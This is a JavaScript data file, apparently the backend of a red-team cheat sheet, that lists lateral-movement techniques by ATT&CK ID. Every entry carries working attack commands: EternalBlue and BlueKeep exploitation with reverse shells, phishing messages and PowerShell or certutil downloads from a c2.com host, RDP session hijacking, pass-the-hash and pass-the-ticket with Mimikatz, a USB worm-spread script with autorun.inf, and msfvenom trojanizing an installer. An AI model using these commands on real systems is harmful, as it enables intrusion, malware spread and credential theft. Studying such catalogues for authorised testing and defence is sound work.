export const lateralMovementTechniques = [
  {
    id: "T1210",
    name: "Exploitation of Remote Services",
    summary: "EternalBlue • BlueKeep • remote exploits",
    description: "Exploiting software vulnerabilities in remote services to move laterally from one system to another within the network.",
    tags: ["T1210", "EternalBlue", "BlueKeep", "remote exploit"],
    steps: [
      { type: "comment", content: "# MS17-010 EternalBlue exploitation" },
      { type: "cmd", content: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST attacker; run'" },
      { type: "comment", content: "# CVE-2019-0708 BlueKeep RDP exploitation" },
      { type: "cmd", content: "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS target; run'" },
      { type: "comment", content: "# Exploit SMB vulnerabilities with nmap first" },
      { type: "cmd", content: "nmap --script smb-vuln-ms17-010,smb-vuln-cve-2017-7494 -p445 target" },
    ]
  },
  {
    id: "T1534",
    name: "Internal Spearphishing",
    summary: "email from compromised account • Teams/Slack phishing",
    description: "Using internal messaging systems or compromised accounts to send phishing messages to other internal targets.",
    tags: ["T1534", "internal phishing", "Teams", "Slack", "email pivot"],
    steps: [
      { type: "comment", content: "# Send phishing email from compromised internal account" },
      { type: "cmd", content: "# Access via compromised mailbox and send malicious link\nswaks --from compromised@corp.com --to target@corp.com --server smtp.corp.com --header 'Subject: HR Important Update' --body 'Click here: http://c2.com/payload'" },
      { type: "comment", content: "# Phishing via Microsoft Teams from compromised account" },
      { type: "cmd", content: "# TeamsPhisher (https://github.com/Octoberfest7/TeamsPhisher):\npython3 TeamsPhisher.py -u attacker@tenant.com -p pass -m 'Check this: http://c2.com/malware.exe' -t victim@corp.com" },
    ]
  },
  {
    id: "T1570",
    name: "Lateral Tool Transfer",
    summary: "SMB copy • SCP • certutil • PowerShell download",
    description: "Transferring tools and payloads between systems during lateral movement using various file transfer mechanisms.",
    tags: ["T1570", "SMB copy", "SCP", "file transfer", "lateral"],
    steps: [
      { type: "comment", content: "# Transfer tool via SMB share" },
      { type: "cmd", content: "net use \\\\target\\C$ /user:DOMAIN\\admin password\ncopy payload.exe \\\\target\\C$\\Windows\\Temp\\\nnet use \\\\target\\C$ /delete" },
      { type: "comment", content: "# Transfer via SCP on Linux" },
      { type: "cmd", content: "scp -i id_rsa payload.sh user@target:/tmp/" },
      { type: "comment", content: "# Download from C2 on target machine via PowerShell" },
      { type: "cmd", content: "(New-Object Net.WebClient).DownloadFile('http://c2.com/tool.exe', 'C:\\Windows\\Temp\\svchost.exe')\ncertutil -urlcache -split -f http://c2.com/tool.exe C:\\Windows\\Temp\\tool.exe" },
    ]
  },
  {
    id: "T1563",
    name: "Remote Service Session Hijacking",
    summary: "RDP session hijack • SSH hijack",
    description: "Taking over existing remote service sessions from other users to gain access without authenticating.",
    tags: ["T1563", "RDP hijack", "SSH hijack", "session takeover"],
    steps: [
      { type: "comment", content: "# T1563.002 - RDP session hijacking (requires SYSTEM)" },
      { type: "cmd", content: "query session  # List active RDP sessions\ntscon <SESSION_ID> /dest:<YOUR_SESSION>  # Hijack without credentials!" },
      { type: "comment", content: "# T1563.001 - SSH session hijacking via socket sharing" },
      { type: "cmd", content: "# If SSH master socket exists:\nssh -S /tmp/ssh_socket_target user@target ls" },
    ]
  },
  {
    id: "T1021",
    name: "Remote Services",
    summary: "SMB/PsExec • SSH • WinRM • RDP • VNC",
    description: "Using legitimate remote services to move laterally across the network with valid credentials.",
    tags: ["T1021", "SMB", "SSH", "WinRM", "RDP", "PsExec"],
    steps: [
      { type: "comment", content: "# T1021.002 - SMB lateral movement via PsExec" },
      { type: "cmd", content: "psexec.py domain/user:pass@target.com\npsexec.py -hashes :NTHASH domain/user@target.com" },
      { type: "comment", content: "# T1021.006 - WinRM lateral movement" },
      { type: "cmd", content: "evil-winrm -i target -u user -p password\nevil-winrm -i target -u user -H NTHASH" },
      { type: "comment", content: "# T1021.001 - RDP with stolen credentials or hash" },
      { type: "cmd", content: "xfreerdp /v:target /u:user /p:password /d:domain /cert-ignore\nxfreerdp /v:target /u:user /pth:NTHASH /d:domain  # Restricted Admin mode" },
      { type: "comment", content: "# T1021.004 - SSH lateral movement on Linux" },
      { type: "cmd", content: "ssh -i id_rsa user@target\nssh -o 'ProxyJump user@jumphost' user@internal-target" },
    ]
  },
  {
    id: "T1091",
    name: "Replication Through Removable Media",
    summary: "USB spread • autorun.inf • worm propagation",
    description: "Spreading malware to additional systems through infected removable media.",
    tags: ["T1091", "USB spread", "worm", "removable media"],
    steps: [
      { type: "comment", content: "# Copy malware to all removable drives automatically" },
      { type: "code", content: "# PowerShell auto-spread to USB drives\nGet-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | ForEach-Object {\n    Copy-Item 'C:\\Windows\\Temp\\malware.exe' \"$($_.DeviceID)\\System32\\\"  \n    # Create autorun\n    Set-Content \"$($_.DeviceID)\\autorun.inf\" \"[autorun]`nopen=System32\\malware.exe`nicon=folder.ico\"\n}" },
    ]
  },
  {
    id: "T1080",
    name: "Taint Shared Content",
    summary: "infect shares • malicious Office templates • trojanize",
    description: "Placing malicious content on shared network resources like file shares or code repositories to infect users who access them.",
    tags: ["T1080", "shared content", "network shares", "trojanize"],
    steps: [
      { type: "comment", content: "# Find writable network shares for content tainting" },
      { type: "cmd", content: "nxc smb targets.txt -u user -p pass --shares 2>&1 | grep 'WRITE'\n# Spider accessible shares:\nnxc smb target -u user -p pass --spider '' --depth 3 --pattern .docx,.xlsx" },
      { type: "comment", content: "# Replace legitimate executables with trojanized versions" },
      { type: "cmd", content: "# Backdoor installer using msfvenom:\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=c2.com LPORT=443 -x legitimate_setup.exe -k -f exe -o trojanized_setup.exe" },
    ]
  },
  {
    id: "T1550",
    name: "Use Alternate Authentication Material",
    summary: "Pass-the-Hash • Pass-the-Ticket • Pass-the-Cert",
    description: "Using alternate authentication materials like password hashes, Kerberos tickets, or certificates to authenticate without plaintext passwords.",
    tags: ["T1550", "Pass-the-Hash", "Pass-the-Ticket", "overpass-the-hash"],
    steps: [
      { type: "comment", content: "# T1550.002 - Pass the Hash with nxc and impacket" },
      { type: "cmd", content: "nxc smb targets.txt -u Administrator -H 'NTHASH' --local-auth\nwmiexec.py -hashes :NTHASH domain/user@target" },
      { type: "comment", content: "# T1550.003 - Pass the Ticket - export and reuse Kerberos TGT" },
      { type: "cmd", content: "# Export tickets from Mimikatz:\nmimikatz # sekurlsa::tickets /export\n# Convert .kirbi to .ccache:\nticketsConverter.py admin.kirbi admin.ccache\nexport KRB5CCNAME=admin.ccache\npsexec.py -k -no-pass domain/admin@target" },
      { type: "comment", content: "# T1550.004 - Pass the Cookie / Web Session" },
      { type: "text", content: "Import stolen session cookie into browser DevTools (Application > Cookies) to authenticate as victim user." },
    ]
  },
];